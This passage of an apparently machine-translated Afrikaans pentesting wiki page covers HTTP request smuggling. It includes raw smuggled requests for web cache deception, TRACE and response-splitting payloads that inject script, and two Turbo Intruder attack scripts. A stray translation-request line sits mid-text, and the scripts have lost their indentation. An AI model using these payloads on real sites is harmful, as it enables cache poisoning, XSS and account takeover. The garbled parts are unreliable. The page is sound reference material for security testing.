### Gebruik van HTTP request smuggling om web cache deception uit te voer <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Wat is die verskil tussen web cache poisoning en web cache deception?**
>
> - In **web cache poisoning**, die aanvaller veroorsaak dat die toepassing sekere kwaadwillige inhoud in die cache stoor, en hierdie inhoud word uit die cache aan ander toepassingsgebruikers bedien.
> - In **web cache deception**, die aanvaller veroorsaak dat die toepassing sensitiewe inhoud van 'n ander gebruiker in die cache stoor, en die aanvaller haal dan hierdie inhoud uit die cache.

Die aanvaller vervaardig 'n gesmokkelde versoek wat sensitiewe gebruiker-spesifieke inhoud ophaal. Oorweeg die volgende voorbeeld:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
`` \ `0`\ ``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
As hierdie gesmokkelde request 'n cache-inskrywing wat bedoel is vir statiese inhoud (bv. `/someimage.png`) vergiftig, kan die slagoffer se sensitiewe data van `/private/messages` onder die statiese inhoud se cache-inskrywing geberg word. Gevolglik kan die aanvaller moontlik daardie in die cache gebergde sensitiewe data terugkry.

### Misbruik van TRACE via HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**In this post**](https://portswigger.net/research/trace-desync-attack) stel voor dat as die server die metode TRACE geaktiveer het, dit moontlik kan wees om dit met 'n HTTP Request Smuggling te misbruik. Dit is omdat hierdie metode enige header wat na die server gestuur word as deel van die response body sal terugspieël. Byvoorbeeld:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
Stuur asseblief die inhoud van src/pentesting-web/http-request-smuggling/README.md wat jy in Afrikaans vertaal wil hê.
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
An example on how to abuse this behaviour would be to **smuggle first a HEAD request**. This request will be responded with only the **headers** of a GET request (**`Content-Type`** among them). And smuggle **immediately after the HEAD a TRACE request**, which will be **reflecting the sent dat**a.\
Aangesien die HEAD response `n `Content-Length` header sal bevat, sal die **response van die TRACE request as die body van die HEAD response behandel word, en dus arbitrêre data in die response weerspieël**.\
Hierdie response sal na die volgende request oor die verbinding gestuur word, so dit kan **byvoorbeeld in 'n gecachede JS-lêer gebruik word om arbitrêre JS-kode in te voeg**.

### Misbruik van TRACE via HTTP Response Splitting <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Dit word voorgestel om [**hierdie pos**](https://portswigger.net/research/trace-desync-attack) te volg vir 'n ander manier om die TRACE-metode te misbruik. Soos bespreek, deur 'n HEAD request en 'n TRACE request te smuggle is dit moontlik om **sekere weerspieëlde data te beheer** in die response op die HEAD request. Die lengte van die body van die HEAD request word basies aangedui in die `Content-Length` header en word gevorm deur die response van die TRACE request.

Dus, die nuwe idee sou wees dat, as hierdie `Content-Length` en die data in die TRACE-response bekend is, dit moontlik is om die TRACE-response 'n geldige HTTP response te laat bevat ná die laaste byte van die Content-Length, wat 'n aanvaller toelaat om die request na die volgende response heeltemal te beheer (wat gebruik kan word om cache poisoning uit te voer).

Example:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
Sal hierdie responses genereer (let op hoe die HEAD response 'n Content-Length het wat die TRACE response deel van die HEAD body maak, en sodra die HEAD Content-Length eindig, word 'n geldige HTTP response gesmokkel):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(“arbitrary response”)</script>
```
### Wapenisering van HTTP Request Smuggling met HTTP Response Desynchronisation

Het jy 'n HTTP Request Smuggling kwesbaarheid gevind en weet nie hoe om dit uit te buit nie? Probeer hierdie ander metodes van uitbuiting:


{{#ref}}
../http-response-smuggling-desync.md
{{#endref}}

### Ander HTTP Request Smuggling Tegnieke

- Browser HTTP Request Smuggling (Client Side)


{{#ref}}
browser-http-request-smuggling.md
{{#endref}}

- Request Smuggling in HTTP/2 Downgrades


{{#ref}}
request-smuggling-in-http-2-downgrades.md
{{#endref}}

## Turbo intruder skripte

### CL.TE

Van [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Van: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Gereedskap

- HTTP Hacker (Burp BApp Store) – visualiseer concatenation/framing en laagvlak HTTP-gedrag
- https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda Burp Repeater Custom Action "Smuggling or pipelining?"
- [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
- [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
- [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
- [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
- [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
- [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Hierdie hulpmiddel is 'n grammatika-gebaseerde HTTP Fuzzer wat nuttig is om vreemde request smuggling-afwykings op te spoor.

## Verwysings

- [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
- [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
- [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
- [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
- [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
- [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
- [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
- [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)
- [https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- Pasop vir die vals vals-positief: hoe om HTTP pipelining van request smuggling te onderskei – [https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling](https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling)
- [https://http1mustdie.com/](https://http1mustdie.com/)
- Browser‑Powered Desync Attacks – [https://portswigger.net/research/browser-powered-desync-attacks](https://portswigger.net/research/browser-powered-desync-attacks)
- PortSwigger Academy – client‑side desync – [https://portswigger.net/web-security/request-smuggling/browser/client-side-desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync)


{{#include ../../banners/hacktricks-training.md}}
